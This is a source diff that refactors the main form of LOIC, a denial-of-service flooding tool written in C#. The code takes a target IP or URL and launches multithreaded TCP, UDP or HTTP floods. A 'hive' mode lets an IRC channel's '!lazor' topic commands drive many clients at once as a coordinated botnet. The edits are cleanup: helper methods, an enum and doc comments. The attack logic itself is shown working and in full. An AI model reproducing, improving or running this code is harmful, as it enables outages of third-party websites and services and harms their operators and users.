@@ -4,29 +4,39 @@
  */
 
 using System;
-using System.Net;
 using System.Collections.Generic;
-using System.Windows.Forms;
+using System.Net;
 using System.Threading;
-using System.Text;
+using System.Windows.Forms;
 using Meebey.SmartIrc4net;
 
 namespace LOIC
 {
 	public partial class frmMain : Form
 	{
+		const string AttackText = "IMMA CHARGIN MAH LAZER";
+
 		private static XXPFlooder[] xxp;
 		private static HTTPFlooder[] http;
 		private static string sHost, sIP, sMethod, sData, sSubsite;
-		private static int iPort, iThreads, iProtocol, iDelay, iTimeout;
+		private static int iPort, iThreads, iDelay, iTimeout;
+		Protocol protocol;
 		private static bool intShowStats;
 		private static IrcClient irc;
 		private static Thread irclisten;
 		private static string channel;
-		private static bool ircenabled = false;
+		private static bool ircenabled;
 		private static Dictionary<string, string> OpList;
 		private delegate void CheckParamsDelegate(List<string> pars);
 
+		/// <summary>
+		/// Initializes a new instance of the <see cref="LOIC.frmMain"/> class.
+		/// </summary>
+		/// <param name="hive">Whether to enter hive mode.</param>
+		/// <param name="hide">Whether to hide the form.</param>
+		/// <param name="ircserver">The irc server.</param>
+		/// <param name="ircport">The irc port.</param>
+		/// <param name="ircchannel">The irc channel.</param>
 		public frmMain(bool hive, bool hide, string ircserver, string ircport, string ircchannel)
 		{
 			InitializeComponent();
@@ -45,53 +55,68 @@ namespace LOIC
 				this.ShowInTaskbar = false;
 			}
 			this.FormClosing += frmMain_Closing;
-			if(hive) enableHive.Checked = true;
-			if(!hive) disableHive.Checked = true;
+			enableHive.Checked |= hive;
+			disableHive.Checked |= !hive;
 		}
+
+		/// <summary>
+		/// Attack the specified target
+		/// </summary>
+		/// <param name="toggle">Whether to toggle.</param>
+		/// <param name="on">Whether the attack should start.</param>
+		/// <param name="silent">Whether to silence error output.</param>
 		private void Attack(bool toggle, bool on, bool silent)
 		{
-			if((cmdAttack.Text == "IMMA CHARGIN MAH LAZER" && toggle == true) || (toggle == false && on == true))
+			if((cmdAttack.Text == AttackText && toggle) || (!toggle && on))
 			{
-				try
-				{
-					try { iPort = Convert.ToInt32(txtPort.Text); }
-					catch { throw new Exception("I don't think ports are supposed to be written like THAT."); }
-
-					try { iThreads = Convert.ToInt32(txtThreads.Text); }
-					catch { throw new Exception("What on earth made you put THAT in the threads field?"); }
-
-					sIP = txtTarget.Text;
-					if(String.IsNullOrEmpty(sIP) || String.Equals(sIP, "N O N E !"))
-						throw new Exception("Select a target.");
-
-					if( String.IsNullOrEmpty(sHost) ) sHost = sIP;
-					if( !sHost.Contains("://") ) sHost = String.Concat("http://", sHost);
-					sHost = new Uri(sHost).Host;
-
-					iProtocol = 0;
-					sMethod = cbMethod.Text;
-					if(String.Equals(sMethod, "TCP")) iProtocol = 1;
-					if(String.Equals(sMethod, "UDP")) iProtocol = 2;
-					if(String.Equals(sMethod, "HTTP")) iProtocol = 3;
-					if(iProtocol == 0)
-						throw new Exception("Select a proper attack method.");
-
-					sData = txtData.Text.Replace("\\r", "\r").Replace("\\n", "\n");
-					if(String.IsNullOrEmpty(sData) && (iProtocol == 1 || iProtocol == 2))
-						throw new Exception("Gonna spam with no contents? You're a wise fellow, aren't ya? o.O");
-
-					sSubsite = txtSubsite.Text;
-					if(!sSubsite.StartsWith("/") && (iProtocol == 3))
-						throw new Exception("You have to enter a subsite (for example \"/\")");
-
-					try { iTimeout = Convert.ToInt32(txtTimeout.Text); }
-					catch { throw new Exception("What's up with something like that in the timeout box? =S"); }
+				if (!int.TryParse (txtPort.Text, out iPort)) {
+					Wtf ("I don't think ports are supposed to be written like THAT.", silent);
+					return;
 				}
-				catch (Exception ex)
-				{
-					if(silent) return;
-					new frmWtf().Show(); MessageBox.Show(ex.Message, "What the shit."); return;
+
+				if (!int.TryParse (txtThreads.Text, out iThreads)) {
+					Wtf ("What on earth made you put THAT in the threads field?", silent);
+					return;
 				}
+
+				sIP = txtTarget.Text;
+				if (String.IsNullOrEmpty (sIP) || String.Equals (sIP, "N O N E !")) {
+					Wtf ("Select a target.", silent);
+					return;
+				}
+
+				if( String.IsNullOrEmpty(sHost) ) sHost = sIP;
+				if( !sHost.Contains("://") ) sHost = String.Concat("http://", sHost);
+				sHost = new Uri(sHost).Host;
+
+				sMethod = cbMethod.Text;
+				protocol = Protocol.None;
+				try {
+					protocol = (Protocol) Enum.Parse (typeof (Protocol), sMethod, true);
+					// Analysis disable once EmptyGeneralCatchClause
+				} catch { }
+				if(protocol == Protocol.None) {
+					Wtf ("Select a proper attack method.", silent);
+					return;
+				}
+
+				sData = txtData.Text.Replace(@"\r", "\r").Replace(@"\n", "\n");
+				if(String.IsNullOrEmpty(sData) && (protocol == Protocol.TCP || protocol == Protocol.UDP)) {
+					Wtf ("Gonna spam with no contents? You're a wise fellow, aren't ya? o.O", silent);
+					return;
+				}
+
+				sSubsite = txtSubsite.Text;
+				if (!sSubsite.StartsWith ("/") && (protocol == Protocol.HTTP)) {
+					Wtf ("You have to enter a subsite (for example \"/\")", silent);
+					return;
+				}
+
+				if (!int.TryParse (txtTimeout.Text, out iTimeout)) {
+					Wtf ("What's up with something like that in the timeout box? =S", silent);
+					return;
+				}
+
 				cmdAttack.Text = "Stop flooding";
 
 				if(String.Equals(sMethod, "TCP") || String.Equals(sMethod, "UDP"))
@@ -99,7 +124,7 @@ namespace LOIC
 					xxp = new XXPFlooder[iThreads];
 					for (int a = 0; a < xxp.Length; a++)
 					{
-						xxp[a] = new XXPFlooder(sIP, iPort, iProtocol, iDelay, chkWaitReply.Checked, sData, chkAllowRandom.Checked);
+						xxp[a] = new XXPFlooder(sIP, iPort, (int) protocol, iDelay, chkWaitReply.Checked, sData, chkAllowRandom.Checked);
 						xxp[a].Start();
 					}
 				}
@@ -114,9 +139,9 @@ namespace LOIC
 				}
 				tShowStats.Start();
 			}
-			else if(toggle == true || on == false)
+			else if(toggle || !on)
 			{
-				cmdAttack.Text = "IMMA CHARGIN MAH LAZER";
+				cmdAttack.Text = AttackText;
 				if(xxp != null)
 				{
 					for (int a = 0; a < xxp.Length; a++)
@@ -134,38 +159,60 @@ namespace LOIC
 				//tShowStats.Stop();
 			}
 		}
+
+		/// <summary>
+		/// What the fuck?
+		/// </summary>
+		/// <param name="message">Message.</param>
+		/// <param name="silent">If set to <c>true</c> silent.</param>
+		private void Wtf(string message, bool silent = false)
+		{
+			if (silent)
+				return;
+			new frmWtf().Show();
+			MessageBox.Show(message, "What the shit.");
+		}
+
+		/// <summary>
+		/// Lock on IP target.
+		/// </summary>
+		/// <param name="silent">Silent?</param>
 		private void LockOnIP(bool silent)
 		{
 			if(txtTargetIP.Text.Length == 0)
 			{
-				if(silent) return;
-				new frmWtf().Show();
-				MessageBox.Show("I think you forgot the IP.", "What the shit.");
+				Wtf ("I think you forgot the IP.", silent);
 				return;
 			}
 			txtTarget.Text = txtTargetIP.Text;
 			sHost = txtTargetIP.Text;
 		}
+
+		/// <summary>
+		/// Lock on URL target.
+		/// </summary>
+		/// <param name="silent">Silent?</param>
 		private void LockOnURL(bool silent)
 		{
 			sHost = txtTargetURL.Text.ToLower();
 			if( String.IsNullOrEmpty(sHost) )
 			{
-				if(silent) return;
-				new frmWtf().Show();
-				MessageBox.Show("A URL is fine too...", "What the shit.");
+				Wtf ("A URL is fine too...", silent);
 				return;
 			}
 			if( !sHost.StartsWith("http://") && !sHost.StartsWith("https://") ) sHost = String.Concat("http://", sHost);
 			try { txtTarget.Text = Dns.GetHostEntry(new Uri(sHost).Host).AddressList[0].ToString(); }
 			catch
 			{
-				if(silent) return;
-				new frmWtf().Show();
-				MessageBox.Show("The URL you entered does not resolve to an IP!", "What the shit.");
+				Wtf ("The URL you entered does not resolve to an IP!", silent);
 				return;
 			}
 		}
+
+		/// <summary>
+		/// Hive stuff.
+		/// </summary>
+		/// <param name="enabled">If set to <c>true</c> enabled.</param>
 		private void DoHive(bool enabled)
 		{
 			try
@@ -182,8 +229,7 @@ namespace LOIC
 				}
 				if(disableHive.Checked && enabled)
 				{
-					new frmWtf().Show();
-					MessageBox.Show("Did you filled IRC options correctly?", "What the shit.");
+					Wtf ("Did you filled IRC options correctly?");
 					return;
 				}
 
@@ -197,22 +243,24 @@ namespace LOIC
 				if(enabled)
 				{
 					label25.Text = "Connecting..";
-					irc = new IrcClient();
-					irc.OnConnected += IrcConnected;
-					irc.OnReadLine += OnReadLine;
-					irc.OnChannelMessage += OnMessage;
-					irc.OnOp += OnOp;
-					irc.OnDeop += OnDeOp;
-					irc.OnPart += OnPart;
-					irc.OnNickChange += OnNickChange;
-					irc.OnTopic += OnTopic;
-					irc.OnTopicChange += OnTopicChange;
-					irc.OnQuit += OnQuit;
-					irc.OnKick += OnKick;
-					irc.OnDisconnected += IrcDisconnected;
-					irc.OnNames += OnNames;
-					irc.AutoRejoinOnKick = true;
-					irc.AutoRejoin = true;
+					if (irc == null) {
+						irc = new IrcClient();
+						irc.OnConnected += IrcConnected;
+						irc.OnReadLine += OnReadLine;
+						irc.OnChannelMessage += OnMessage;
+						irc.OnOp += OnOp;
+						irc.OnDeop += OnDeOp;
+						irc.OnPart += OnPart;
+						irc.OnNickChange += OnNickChange;
+						irc.OnTopic += OnTopic;
+						irc.OnTopicChange += OnTopicChange;
+						irc.OnQuit += OnQuit;
+						irc.OnKick += OnKick;
+						irc.OnDisconnected += IrcDisconnected;
+						irc.OnNames += OnNames;
+						irc.AutoRejoinOnKick = true;
+						irc.AutoRejoin = true;
+					}
 					try
 					{
 						int port;
@@ -223,9 +271,10 @@ namespace LOIC
 						irc.Login("LOIC_" + Functions.RandomString(), "Newfag's remote LOIC", 0, "IRCLOIC");
 
 						// Spawn a thread to handle the listen.
-						irclisten = new Thread(new ThreadStart(IrcListenThread));
+						irclisten = new Thread(IrcListenThread);
 						irclisten.Start();
 					}
+					// Analysis disable once EmptyGeneralCatchClause
 					catch
 					{ }
 				}
@@ -233,8 +282,9 @@ namespace LOIC
 				{
 					try
 					{
-						if(irc != null) irc.Disconnect();
+						irc?.Disconnect ();
 					}
+					// Analysis disable once EmptyGeneralCatchClause
 					catch
 					{ }
 					label25.Text = "Disconnected.";
@@ -243,6 +293,10 @@ namespace LOIC
 			catch
 			{ }
 		}
+
+		/// <summary>
+		/// IRC listening thread.
+		/// </summary>
 		private void IrcListenThread()
 		{
 			while (ircenabled)
@@ -250,6 +304,12 @@ namespace LOIC
 				irc.Listen();
 			}
 		}
+
+		/// <summary>
+		/// Handles the IRC OnDisconnected event.
+		/// </summary>
+		/// <param name="o">Sender.</param>
+		/// <param name="e">EventArgs.</param>
 		private void IrcDisconnected(object o, EventArgs e)
 		{
 			if(ircenabled)
@@ -265,11 +325,23 @@ namespace LOIC
 				{ }
 			}
 		}
+
+		/// <summary>
+		/// Handles the IRC OnConnected event.
+		/// </summary>
+		/// <param name="o">Sender.</param>
+		/// <param name="e">EventArgs.</param>
 		private void IrcConnected(object o, EventArgs e)
 		{
 			label25.Text = "Logging In...";
 		}
 		private delegate void AddListBoxItemDelegate(object sender, ReadLineEventArgs e);
+
+		/// <summary>
+		/// Handles the IRC OnNames event.
+		/// </summary>
+		/// <param name="sender">Sender.</param>
+		/// <param name="e">EventArgs.</param>
 		void OnNames(object sender, NamesEventArgs e)
 		{
 			SetStatus("Connected!");
@@ -291,6 +363,12 @@ namespace LOIC
 				}
 			}
 		}
+
+		/// <summary>
+		/// Handles the IRC OnOp event.
+		/// </summary>
+		/// <param name="sender">Sender.</param>
+		/// <param name="e">EventArgs.</param>
 		void OnOp(object sender, OpEventArgs e)
 		{
 			if(OpList == null) OpList = new Dictionary<string, string>();
@@ -299,6 +377,12 @@ namespace LOIC
 				OpList.Add(e.Whom, "");
 			}
 		}
+
+		/// <summary>
+		/// Handles the IRC OnDeOp event.
+		/// </summary>
+		/// <param name="sender">Sender.</param>
+		/// <param name="e">EventArgs.</param>
 		void OnDeOp(object sender, DeopEventArgs e)
 		{
 			if(OpList == null) OpList = new Dictionary<string, string>();
@@ -307,6 +391,12 @@ namespace LOIC
 				OpList.Remove(e.Whom);
 			}
 		}
+
+		/// <summary>
+		/// Handles the IRC OnPart event.
+		/// </summary>
+		/// <param name="sender">Sender.</param>
+		/// <param name="e">EventArgs.</param>
 		void OnPart(object sender, PartEventArgs e)
 		{
 			if(OpList == null) OpList = new Dictionary<string, string>();
@@ -315,6 +405,12 @@ namespace LOIC
 				OpList.Remove(e.Who);
 			}
 		}
+
+		/// <summary>
+		/// Handles the IRC OnQuit event.
+		/// </summary>
+		/// <param name="sender">Sender.</param>
+		/// <param name="e">EventArgs.</param>
 		void OnQuit(object sender, QuitEventArgs e)
 		{
 			if(OpList == null) OpList = new Dictionary<string, string>();
@@ -323,6 +419,12 @@ namespace LOIC
 				OpList.Remove(e.Who);
 			}
 		}
+
+		/// <summary>
+		/// Handles the IRC OnTopic event.
+		/// </summary>
+		/// <param name="sender">Sender.</param>
+		/// <param name="e">EventArgs.</param>
 		void OnTopic(object sender, TopicEventArgs e)
 		{
 			if(e.Channel.ToLower() == channel && e.Topic.StartsWith("!lazor "))
@@ -337,6 +439,12 @@ namespace LOIC
 				{ }
 			}
 		}
+
+		/// <summary>
+		/// Handles the IRC OnTopicChange event.
+		/// </summary>
+		/// <param name="sender">Sender.</param>
+		/// <param name="e">EventArgs.</param>
 		void OnTopicChange(object sender, TopicChangeEventArgs e)
 		{
 			if(e.Channel.ToLower() == channel && e.NewTopic.StartsWith("!lazor "))
@@ -351,6 +459,12 @@ namespace LOIC
 				{ }
 			}
 		}
+
+		/// <summary>
+		/// Handles the IRC OnNickChange event.
+		/// </summary>
+		/// <param name="sender">Sender.</param>
+		/// <param name="e">EventArgs.</param>
 		void OnNickChange(object sender, NickChangeEventArgs e)
 		{
 			if(OpList.ContainsKey(e.OldNickname))
@@ -362,6 +476,12 @@ namespace LOIC
 				OpList.Add(e.NewNickname, "");
 			}
 		}
+
+		/// <summary>
+		/// Handles the IRC OnKick event.
+		/// </summary>
+		/// <param name="sender">Sender.</param>
+		/// <param name="e">EventArgs.</param>
 		void OnKick(object sender, KickEventArgs e)
 		{
 			if(OpList == null) OpList = new Dictionary<string, string>();
@@ -371,6 +491,11 @@ namespace LOIC
 			}
 		}
 		private delegate void SetStatusDelegate(string status);
+
+		/// <summary>
+		/// Sets the status.
+		/// </summary>
+		/// <param name="status">Status.</param>
 		void SetStatus(string status)
 		{
 			if(label25.InvokeRequired)
@@ -382,6 +507,12 @@ namespace LOIC
 				label25.Text = status;
 			}
 		}
+
+		/// <summary>
+		/// Handles the IRC OnMessage event.
+		/// </summary>
+		/// <param name="sender">Sender.</param>
+		/// <param name="e">EventArgs.</param>
 		void OnMessage(object sender, IrcEventArgs e)
 		{
 			if(e.Data.Channel.ToLower() == channel)
@@ -403,6 +534,11 @@ namespace LOIC
 				}
 			}
 		}
+
+		/// <summary>
+		/// Checks the parameters.
+		/// </summary>
+		/// <param name="pars">Pars.</param>
 		void CheckParams(List<string> pars)
 		{
 			Attack(false, false, true);
@@ -524,6 +660,12 @@ namespace LOIC
 			}
 			SetStatus("Waiting.");
 		}
+
+		/// <summary>
+		/// Handles the IRC OnReadLine event.
+		/// </summary>
+		/// <param name="sender">Sender.</param>
+		/// <param name="e">EventArgs.</param>
 		void OnReadLine(object sender, ReadLineEventArgs e)
 		{
 			string command = e.Line.Split(' ')[1];
@@ -538,18 +680,31 @@ namespace LOIC
 				irc.RfcJoin(channel);
 			}
 		}
+
+		/// <summary>
+		/// Handles the Form Load event.
+		/// </summary>
+		/// <param name="sender">Sender.</param>
+		/// <param name="e">EventArgs.</param>
 		private void frmMain_Load(object sender, EventArgs e)
 		{
 			this.Text = String.Format("{0} | U dun goofed | v. {1}", Application.ProductName, Application.ProductVersion);
 		}
+
+		/// <summary>
+		/// Handles the Form Closing event.
+		/// </summary>
+		/// <param name="sender">Sender.</param>
+		/// <param name="e">EventArgs.</param>
 		private void frmMain_Closing(object sender, FormClosingEventArgs e)
 		{
 			try
 			{
 				ircenabled = false;
-				if(irclisten != null) irclisten.Abort();
-				if(irc != null) irc.Disconnect();
+				irclisten?.Abort();
+				irc?.Disconnect();
 			}
+			// Analysis disable once EmptyGeneralCatchClause
 			catch
 			{ }
 			finally
@@ -557,29 +712,59 @@ namespace LOIC
 				Environment.Exit(0);
 			}
 		}
+
+		/// <summary>
+		/// Handles the cmdTargetURL Click event.
+		/// </summary>
+		/// <param name="sender">Sender.</param>
+		/// <param name="e">EventArgs.</param>
 		private void cmdTargetURL_Click(object sender, EventArgs e)
 		{
 			LockOnURL(false);
 		}
+
+		/// <summary>
+		/// Handles the cmdTargetIP Click event.
+		/// </summary>
+		/// <param name="sender">Sender.</param>
+		/// <param name="e">EventArgs.</param>
 		private void cmdTargetIP_Click(object sender, EventArgs e)
 		{
 			LockOnIP(false);
 		}
+
+		/// <summary>
+		/// Handles the txtTarget Enter event.
+		/// </summary>
+		/// <param name="sender">Sender.</param>
+		/// <param name="e">EventArgs.</param>
 		private void txtTarget_Enter(object sender, EventArgs e)
 		{
 			cmdAttack.Focus();
 		}
+
+		/// <summary>
+		/// Handles the cmdAttack Click event.
+		/// </summary>
+		/// <param name="sender">Sender.</param>
+		/// <param name="e">EventArgs.</param>
 		private void cmdAttack_Click(object sender, EventArgs e)
 		{
 			Attack(true, false, false);
 		}
+
+		/// <summary>
+		/// Handles the tShowStats Tick event.
+		/// </summary>
+		/// <param name="sender">Sender.</param>
+		/// <param name="e">EventArgs.</param>
 		private void tShowStats_Tick(object sender, EventArgs e)
 		{
 			if(intShowStats) return; intShowStats = true;
 
 			bool isFlooding = false;
 			if(cmdAttack.Text == "Stop for now") isFlooding = true;
-			if(iProtocol == 1 || iProtocol == 2)
+			if(protocol == Protocol.TCP || protocol == Protocol.UDP)
 			{
 				int iFloodCount = 0;
 				for (int a = 0; a < xxp.Length; a++)
@@ -588,7 +773,7 @@ namespace LOIC
 				}
 				lbRequested.Text = iFloodCount.ToString();
 			}
-			if(iProtocol == 3 && http != null)
+			if(protocol == Protocol.HTTP && http != null)
 			{
 				int iIdle = 0;
 				int iConnecting = 0;
@@ -636,6 +821,12 @@ namespace LOIC
 
 			intShowStats = false;
 		}
+
+		/// <summary>
+		/// Handles the tbSpeed ValueChanged event.
+		/// </summary>
+		/// <param name="sender">Sender.</param>
+		/// <param name="e">EventArgs.</param>
 		private void tbSpeed_ValueChanged(object sender, EventArgs e)
 		{
 			iDelay = tbSpeed.Value;
@@ -654,6 +845,12 @@ namespace LOIC
 				}
 			}
 		}
+
+		/// <summary>
+		/// Handles the enableHive CheckedChanged event.
+		/// </summary>
+		/// <param name="sender">Sender.</param>
+		/// <param name="e">EventArgs.</param>
 		private void enableHive_CheckedChanged(object sender, EventArgs e)
 		{
 			if(enableHive.Checked)
@@ -661,6 +858,12 @@ namespace LOIC
 				DoHive(true);
 			}
 		}
+
+		/// <summary>
+		/// Handles the disableHive CheckedChanged event.
+		/// </summary>
+		/// <param name="sender">Sender.</param>
+		/// <param name="e">EventArgs.</param>
 		private void disableHive_CheckedChanged(object sender, EventArgs e)
 		{
 			if(disableHive.Checked)
@@ -668,6 +871,12 @@ namespace LOIC
 				DoHive(false);
 			}
 		}
+
+		/// <summary>
+		/// Handles the label24 Click event.
+		/// </summary>
+		/// <param name="sender">Sender.</param>
+		/// <param name="e">EventArgs.</param>
 		private void label24_Click(object sender, EventArgs e)
 		{
 			System.Diagnostics.Process.Start("http://github.com/NewEraCracker/LOIC");
